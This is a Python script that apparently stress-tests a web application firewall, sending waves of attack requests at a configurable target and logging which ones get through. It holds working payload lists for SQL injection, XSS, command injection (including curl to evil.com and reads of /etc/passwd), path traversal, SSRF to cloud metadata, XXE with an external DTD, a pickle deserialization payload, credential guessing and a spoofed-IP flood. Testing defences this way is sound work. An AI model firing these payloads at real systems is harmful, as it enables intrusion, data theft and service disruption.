#!/usr/bin/env python3
"""
WAF Shibuya Comprehensive Stress Test
=====================================
Generates 10,000+ attack requests across all OWASP Top 10 categories.
Logs results to attack_log.jsonl for analysis.

Usage:
    python comprehensive_stress_test.py --target http://localhost:8080 --duration 300
"""

import asyncio
import aiohttp
import time
import json
import random
import argparse
import os
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from pathlib import Path

# ==========================================
# CONFIGURATION
# ==========================================

TARGET_URL = "http://localhost:8080"
OUTPUT_DIR = Path(__file__).parent / "reports"
LOG_FILE = Path(__file__).parent / "attack_log.jsonl"

# Statistics tracker
@dataclass
class AttackStats:
    total_requests: int = 0
    blocked: int = 0
    passed: int = 0
    errors: int = 0
    latencies: List[float] = field(default_factory=list)
    bypassed_attacks: List[Dict] = field(default_factory=list)
    category_stats: Dict[str, Dict] = field(default_factory=dict)
    start_time: Optional[str] = None
    end_time: Optional[str] = None

stats = AttackStats()
log_file_handle = None

# ==========================================
# ATTACK PAYLOADS
# ==========================================

SQL_INJECTION_PAYLOADS = [
    # Classic
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username, password FROM users--",
    # Blind SQLi
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND 1=1--",
    "' AND 1=2--",
    # Time-based
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT BENCHMARK(10000000,SHA1('test'))--",
    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
    # Obfuscated
    "' /**/OR/**/ '1'='1",
    "' %55NION %53ELECT 1,2,3--",
    "admin'/**/--",
    "%27%20OR%201%3D1--",
    "' OR ''='",
    "'-'",
    # Multi-statement
    "'; INSERT INTO users VALUES(999,'hacker','owned')--",
]

XSS_PAYLOADS = [
    # Basic
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    # URL-based
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # Obfuscated
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script/src=//evil.com/xss.js>",
    "<<script>alert(1)//",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    # SVG
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    # Iframe
    "<iframe src=javascript:alert(1)>",
]

COMMAND_INJECTION_PAYLOADS = [
    # Basic
    "; ls -la",
    "| whoami",
    "& id",
    "; cat /etc/passwd",
    # Backticks
    "`ls`",
    "`cat /etc/passwd`",
    "`id`",
    # Subshell
    "$(whoami)",
    "$(cat /etc/passwd)",
    "$(curl http://evil.com)",
    # Newline
    "\nls -la",
    "\ncat /etc/passwd",
    # Chained
    "; ls -la; whoami; id",
    "| ls -la | cat /etc/passwd",
    # Windows
    "& dir C:\\",
    "| type C:\\Windows\\System32\\config\\SAM",
    # Encoded
    "%3B%20ls%20-la",
    "%7C%20whoami",
]

PATH_TRAVERSAL_PAYLOADS = [
    # Basic
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//etc/passwd",
    # URL encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Double encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Windows
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\boot.ini",
    # Null byte
    "../../etc/passwd%00.jpg",
    "../../etc/passwd\x00.jpg",
    # Unicode
    "..%c0%af..%c0%afetc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # Absolute paths
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

SSRF_PAYLOADS = [
    # Internal IPs
    "http://127.0.0.1:8080/admin",
    "http://localhost/admin",
    "http://0.0.0.0:8080",
    "http://[::1]/admin",
    # Alternative localhost
    "http://127.1/",
    "http://0177.0.0.1/",
    "http://0x7f.0x0.0x0.0x1/",
    "http://2130706433/",  # Decimal IP
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/",
    # Internal services
    "http://127.0.0.1:6379",  # Redis
    "http://127.0.0.1:11211",  # Memcached
    "http://127.0.0.1:5432",  # PostgreSQL
    "http://127.0.0.1:3306",  # MySQL
    # URL bypass
    "http://127.0.0.1#@example.com/",
    "http://example.com@127.0.0.1/",
    "http://127.0.0.1.nip.io/",
]

XXE_PAYLOADS = [
    # Basic XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    # External DTD
    '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><root>&xxe;</root>',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root></root>',
    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    # Billion laughs (DoS)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><root>&lol2;</root>',
]

GRAPHQL_PAYLOADS = [
    # Deep nesting
    '{"query": "{ user { friends { friends { friends { friends { friends { name } } } } } } }"}',
    # Alias bombing
    '{"query": "{ ' + ' '.join([f'a{i}: user {{ name }}' for i in range(100)]) + ' }"}',
    # Introspection
    '{"query": "{ __schema { types { name } } }"}',
    # Batching
    json.dumps([{"query": "{ user { name } }"} for _ in range(50)]),
    # Field duplication
    '{"query": "{ user { name name name name name name name name name name } }"}',
]

AUTH_BYPASS_PAYLOADS = [
    {"username": "admin' OR '1'='1", "password": "x"},
    {"username": "admin'--", "password": "x"},
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "' UNION SELECT * FROM users--", "password": "x"},
    {"username": "admin", "password": "admin"},
    {"username": "root", "password": "root"},
    {"username": "administrator", "password": "password"},
]

DESERIALIZATION_PAYLOADS = [
    # Base64 encoded pickle (Python)
    "gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwHb3MucG9wZW6UhZRSlC4=",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

# ==========================================
# ATTACK FUNCTIONS
# ==========================================

def init_category(category: str):
    if category not in stats.category_stats:
        stats.category_stats[category] = {
            "total": 0,
            "blocked": 0,
            "passed": 0,
            "errors": 0,
            "bypassed": []
        }

async def log_attack(entry: dict):
    global log_file_handle
    if log_file_handle:
        log_file_handle.write(json.dumps(entry) + "\n")
        log_file_handle.flush()

async def send_attack(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    category: str,
    payload: str,
    params: dict = None,
    data: dict = None,
    json_data: dict = None,
    headers: dict = None
):
    """Send a single attack request and track results"""
    init_category(category)
    
    start = time.time()
    entry = {
        "timestamp": datetime.now().isoformat(),
        "category": category,
        "method": method,
        "url": url,
        "payload": payload[:500],  # Truncate for logging
        "params": params,
        "status": None,
        "blocked": False,
        "latency_ms": None,
        "error": None
    }
    
    try:
        req_headers = {"User-Agent": random.choice(USER_AGENTS)}
        if headers:
            req_headers.update(headers)
        
        async with session.request(
            method, url,
            params=params,
            data=data,
            json=json_data,
            headers=req_headers,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False
        ) as response:
            latency = (time.time() - start) * 1000
            entry["status"] = response.status
            entry["latency_ms"] = round(latency, 2)
            
            stats.total_requests += 1
            stats.category_stats[category]["total"] += 1
            stats.latencies.append(latency)
            
            # Blocked responses: 403, 406, 429
            if response.status in [403, 406, 429]:
                stats.blocked += 1
                stats.category_stats[category]["blocked"] += 1
                entry["blocked"] = True
            elif 200 <= response.status < 400:
                stats.passed += 1
                stats.category_stats[category]["passed"] += 1
                
                # This is a bypass - attack succeeded!
                bypass = {
                    "category": category,
                    "payload": payload[:200],
                    "status": response.status,
                    "url": url
                }
                stats.bypassed_attacks.append(bypass)
                stats.category_stats[category]["bypassed"].append(bypass)
                
                # Warning output for critical bypasses
                if category in ["SQLi", "CMDi", "XXE"]:
                    print(f"\033[91m⚠️ BYPASS: {category} - Status {response.status}\033[0m")
            else:
                stats.errors += 1
                stats.category_stats[category]["errors"] += 1
                
    except asyncio.TimeoutError:
        entry["error"] = "timeout"
        stats.errors += 1
        stats.category_stats[category]["errors"] += 1
    except Exception as e:
        entry["error"] = str(e)[:100]
        stats.errors += 1
        stats.category_stats[category]["errors"] += 1
    
    await log_attack(entry)

# ==========================================
# ATTACK WAVES
# ==========================================

async def wave_reconnaissance(session: aiohttp.ClientSession, duration: int = 30):
    """Wave 1: Reconnaissance attacks"""
    print(f"\n🔍 Wave 1: RECONNAISSANCE ({duration}s)")
    
    recon_paths = [
        "/admin", "/admin/", "/administrator", "/login", "/wp-admin",
        "/.git", "/.git/config", "/.env", "/config.php", "/config.yaml",
        "/backup", "/backup.sql", "/db.sql", "/dump.sql",
        "/api", "/api/v1", "/api/docs", "/swagger.json", "/openapi.json",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt"
    ]
    
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = []
        for path in random.sample(recon_paths, min(10, len(recon_paths))):
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}{path}",
                "Recon", path
            ))
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.1)

async def wave_exploitation(session: aiohttp.ClientSession, duration: int = 120):
    """Wave 2: Mixed exploitation attacks"""
    print(f"\n💥 Wave 2: EXPLOITATION ({duration}s)")
    
    end_time = time.time() + duration
    batch_count = 0
    
    while time.time() < end_time:
        tasks = []
        
        # SQL Injection
        for payload in random.sample(SQL_INJECTION_PAYLOADS, min(5, len(SQL_INJECTION_PAYLOADS))):
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}/api/search",
                "SQLi", payload, params={"q": payload}
            ))
        
        # XSS
        for payload in random.sample(XSS_PAYLOADS, min(5, len(XSS_PAYLOADS))):
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/comment",
                "XSS", payload, data={"text": payload}
            ))
        
        # Command Injection
        for payload in random.sample(COMMAND_INJECTION_PAYLOADS, min(3, len(COMMAND_INJECTION_PAYLOADS))):
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/exec",
                "CMDi", payload, json_data={"cmd": payload}
            ))
        
        # Path Traversal
        for payload in random.sample(PATH_TRAVERSAL_PAYLOADS, min(3, len(PATH_TRAVERSAL_PAYLOADS))):
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}/api/file",
                "PathTraversal", payload, params={"path": payload}
            ))
        
        # SSRF
        for payload in random.sample(SSRF_PAYLOADS, min(3, len(SSRF_PAYLOADS))):
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}/api/fetch",
                "SSRF", payload, params={"url": payload}
            ))
        
        # XXE
        for payload in random.sample(XXE_PAYLOADS, min(2, len(XXE_PAYLOADS))):
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/xml",
                "XXE", payload, data=payload.encode(),
                headers={"Content-Type": "application/xml"}
            ))
        
        # Auth Bypass
        for payload in random.sample(AUTH_BYPASS_PAYLOADS, min(2, len(AUTH_BYPASS_PAYLOADS))):
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/login",
                "AuthBypass", str(payload), json_data=payload
            ))
        
        await asyncio.gather(*tasks)
        batch_count += 1
        
        # Progress indicator every 10 batches
        if batch_count % 10 == 0:
            print(f"   Batch {batch_count}: {stats.total_requests} requests, {stats.blocked} blocked")
        
        await asyncio.sleep(0.05)

async def wave_sustained(session: aiohttp.ClientSession, duration: int = 180):
    """Wave 3: Sustained attack focusing on patterns that bypass"""
    print(f"\n🎯 Wave 3: SUSTAINED ATTACK ({duration}s)")
    
    # Focus on less-detected categories
    end_time = time.time() + duration
    
    while time.time() < end_time:
        tasks = []
        
        # GraphQL attacks
        for payload in GRAPHQL_PAYLOADS:
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/graphql",
                "GraphQL", payload,
                json_data=json.loads(payload) if payload.startswith("{") else {"query": payload},
                headers={"Content-Type": "application/json"}
            ))
        
        # More SQLi with obfuscation
        obfuscated_sqli = [
            "' %4fR '1'='1",
            "admin'/*comment*/--",
            "' /*!50000OR*/ '1'='1",
            "';EXEC('SELECT 1')--",
        ]
        for payload in obfuscated_sqli:
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}/api/search",
                "SQLi", payload, params={"q": payload}
            ))
        
        # Deserialization
        for payload in DESERIALIZATION_PAYLOADS:
            tasks.append(send_attack(
                session, "POST", f"{TARGET_URL}/api/deserialize",
                "Deserialization", payload,
                json_data={"data": payload}
            ))
        
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.1)

async def wave_ddos(session: aiohttp.ClientSession, duration: int = 60):
    """Wave 4: DDoS flood test"""
    print(f"\n🌊 Wave 4: DDOS FLOOD ({duration}s)")
    
    end_time = time.time() + duration
    batch_size = 100
    
    # Rotate X-Forwarded-For to test rate limit bypass
    fake_ips = [f"10.0.{i}.{j}" for i in range(10) for j in range(10)]
    
    while time.time() < end_time:
        tasks = []
        for _ in range(batch_size):
            fake_ip = random.choice(fake_ips)
            tasks.append(send_attack(
                session, "GET", f"{TARGET_URL}/api/data",
                "RateLimitBypass", f"X-Forwarded-For: {fake_ip}",
                params={"limit": 1000},
                headers={"X-Forwarded-For": fake_ip}
            ))
        
        try:
            await asyncio.gather(*tasks)
        except Exception:
            pass
        
        print(f"   DDoS batch: {stats.total_requests} total, {stats.blocked} blocked")
        await asyncio.sleep(0.01)

async def monitor(duration: int):
    """Monitor WAF health during test"""
    async with aiohttp.ClientSession() as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                start = time.time()
                async with session.get(f"{TARGET_URL}/health", timeout=5) as resp:
                    latency = (time.time() - start) * 1000
                    block_rate = (stats.blocked / stats.total_requests * 100) if stats.total_requests > 0 else 0
                    print(f"\n📊 MONITOR: Health={resp.status}, Latency={latency:.0f}ms, "
                          f"Requests={stats.total_requests}, BlockRate={block_rate:.1f}%")
            except Exception as e:
                print(f"\n⚠️ MONITOR: Health check failed: {e}")
            
            await asyncio.sleep(10)

# ==========================================
# MAIN
# ==========================================

async def run_stress_test(duration: int):
    """Execute full stress test"""
    global log_file_handle
    
    stats.start_time = datetime.now().isoformat()
    
    # Open log file
    log_file_handle = open(LOG_FILE, "w")
    
    print(f"\n{'='*60}")
    print(f"🔥 WAF SHIBUYA STRESS TEST")
    print(f"{'='*60}")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {duration}s")
    print(f"Log file: {LOG_FILE}")
    print(f"{'='*60}\n")
    
    # Test connectivity
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{TARGET_URL}/health", timeout=5) as resp:
                if resp.status != 200:
                    print(f"⚠️ Warning: Health check returned {resp.status}")
                else:
                    print("✅ WAF is responding")
        except Exception as e:
            print(f"❌ Cannot connect to WAF: {e}")
            return
    
    # Calculate wave durations (proportional to total)
    wave_times = {
        "recon": max(30, int(duration * 0.06)),
        "exploit": max(120, int(duration * 0.40)),
        "sustained": max(180, int(duration * 0.36)),
        "ddos": max(60, int(duration * 0.18))
    }
    
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Run monitor in background
        monitor_task = asyncio.create_task(monitor(duration))
        
        # Execute waves
        await wave_reconnaissance(session, wave_times["recon"])
        await wave_exploitation(session, wave_times["exploit"])
        await wave_sustained(session, wave_times["sustained"])
        await wave_ddos(session, wave_times["ddos"])
        
        monitor_task.cancel()
    
    stats.end_time = datetime.now().isoformat()
    
    # Close log file
    log_file_handle.close()
    
    # Print summary
    print_summary()

def print_summary():
    """Print test summary"""
    print(f"\n{'='*60}")
    print("📊 STRESS TEST COMPLETE")
    print(f"{'='*60}")
    print(f"Total Requests: {stats.total_requests}")
    print(f"Blocked: {stats.blocked} ({stats.blocked/stats.total_requests*100:.1f}%)" if stats.total_requests else "Blocked: 0")
    print(f"Passed: {stats.passed}")
    print(f"Errors: {stats.errors}")
    print(f"Bypassed Attacks: {len(stats.bypassed_attacks)}")
    
    if stats.latencies:
        latencies = sorted(stats.latencies)
        print(f"\nLatency (ms):")
        print(f"  P50: {latencies[int(len(latencies)*0.5)]:.1f}")
        print(f"  P95: {latencies[int(len(latencies)*0.95)]:.1f}")
        print(f"  P99: {latencies[int(len(latencies)*0.99)]:.1f}")
    
    print(f"\n📁 Category Breakdown:")
    for cat, data in sorted(stats.category_stats.items()):
        total = data["total"]
        blocked = data["blocked"]
        rate = (blocked / total * 100) if total > 0 else 0
        status = "🔴" if rate < 70 else "⚠️" if rate < 95 else "✅"
        print(f"  {status} {cat}: {blocked}/{total} blocked ({rate:.1f}%)")
    
    # Save summary
    OUTPUT_DIR.mkdir(exist_ok=True)
    summary_file = OUTPUT_DIR / "stress_test_summary.json"
    
    summary = {
        "start_time": stats.start_time,
        "end_time": stats.end_time,
        "total_requests": stats.total_requests,
        "blocked": stats.blocked,
        "passed": stats.passed,
        "errors": stats.errors,
        "block_rate": stats.blocked / stats.total_requests if stats.total_requests else 0,
        "bypassed_count": len(stats.bypassed_attacks),
        "category_stats": {
            cat: {
                "total": data["total"],
                "blocked": data["blocked"],
                "passed": data["passed"],
                "block_rate": data["blocked"] / data["total"] if data["total"] else 0,
                "bypassed_count": len(data["bypassed"])
            }
            for cat, data in stats.category_stats.items()
        },
        "top_bypassed": stats.bypassed_attacks[:50]
    }
    
    with open(summary_file, "w") as f:
        json.dump(summary, f, indent=2)
    
    print(f"\n✅ Summary saved to: {summary_file}")
    print(f"✅ Full log saved to: {LOG_FILE}")

def main():
    global TARGET_URL
    
    parser = argparse.ArgumentParser(description="WAF Comprehensive Stress Test")
    parser.add_argument("--target", default="http://localhost:8080", help="WAF URL")
    parser.add_argument("--duration", type=int, default=300, help="Test duration in seconds")
    args = parser.parse_args()
    
    TARGET_URL = args.target
    
    try:
        asyncio.run(run_stress_test(args.duration))
    except KeyboardInterrupt:
        print("\n\n⚠️ Test interrupted by user")
        print_summary()

if __name__ == "__main__":
    main()
